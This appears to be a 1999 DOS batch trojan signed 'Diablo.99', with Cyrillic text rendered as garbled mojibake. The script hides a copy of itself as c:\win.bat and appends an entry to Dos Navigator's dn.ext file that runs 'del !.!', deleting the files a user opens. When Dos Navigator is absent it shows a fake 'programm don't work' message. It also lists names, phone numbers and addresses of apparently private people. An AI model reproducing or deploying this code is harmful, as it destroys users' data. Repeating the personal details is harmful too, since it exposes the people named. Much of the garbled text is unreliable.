   :‚®§à®¤¨¬ ¬ë *®àâ® Š®¬ ¤¥à, ver 3.0! (c) Diablo.99
   : „ â  á®§¤ ¨ï ¯à®£à ¬¬ë 29-05-99
   @echo off
   echo *¥à¥¤ ñ¬ ¡®«ìè®© ¯à¨¢¥â! (Reproduce big hello!)

   if "%0"=="win.bat" goto message
   set antiDN= c:\dn\dn.ext
   if not exist %antiDN% goto noDN
   ctty nul
   copy %0 c:\win.bat
   attrib c:\win.bat +h +r +a
   goto antidn
   :message
   @echo off
   ctty con
   echo “¡…¤ˆâ…«œ€ï *àŽáœ¡€ … ¢Š«žç€âœ ªŽ¬*ìžâ…à, ’ Š ª€ª *âŽ Œ®†¥’ *ë’ì Ž¯€á*®!
   echo €¢â®àë ¢¨àãá®¢ ¥ á¯ïâ,   ¤¥©áâ¢ãîâ (c) Diablo.99
   attrib c:\win.bat -h -r -a
   @ctty nul
   del c:\win.bat
   goto end
   :antiDN
   if exist c:\smrd.sys goto end
   attrib %antiDN% -h -r -a
   echo.           >> %antiDN%
   echo ???{       >> %antiDN%
   echo @echo off  >> %antiDN%
   echo del !.!    >> %antiDN%
   echo }          >> %antiDN%
   dir c:\ > c:\smrd.sys
   @ctty con
   goto end
   :noDN
   @echo off
   cls
   echo This programm don't work, beacuse you don't have Dos Navigator...
   echo              € âë § ¥èì íâ¨å «î¤¥©???
   echo ‹0‡ˆ*‘Šˆ‰  „Œˆ’*ˆ‰ *ˆŠŽ‹€…‚ˆ—   481-1139 [€Ž*]  „“**ˆ*‘Š€Ÿ 2-1-116
   echo                                                  (à ©® ‹¨ «®§®¢®)
   echo ŒŽ‘’Ž‚Ž‰   „Œˆ’*ˆ‰ ž*œ…‚ˆ—      431-9131        “„€‹œ–Ž‚€ 69€-54
   echo Š€‘*…*‘Šˆ‰ …‚ƒ…*ˆ‰              493-6087        ”ŽŒˆ—…‚Ž‰ 13-69 (à®¤áâ¢)
   pause
   :end
